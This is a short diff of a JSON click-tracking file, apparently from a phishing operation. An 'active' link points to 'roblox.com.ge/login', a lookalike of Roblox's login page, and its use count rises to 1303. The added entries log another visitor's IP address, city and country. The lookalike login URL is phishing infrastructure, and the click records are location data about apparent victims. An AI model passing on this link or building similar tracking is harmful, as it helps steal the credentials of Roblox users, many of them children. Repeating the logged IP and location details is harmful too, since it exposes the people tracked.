@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1302,
+    "useCount": 1303,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10555,6 +10555,14 @@
       },
       {
         "timestamp": 1777374342818,
+        "ip": "112.198.231.15",
+        "country": "Philippines",
+        "city": "Cabanatuan City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777374422273,
         "ip": "112.198.231.15",
         "country": "Philippines",
         "city": "Cabanatuan City",
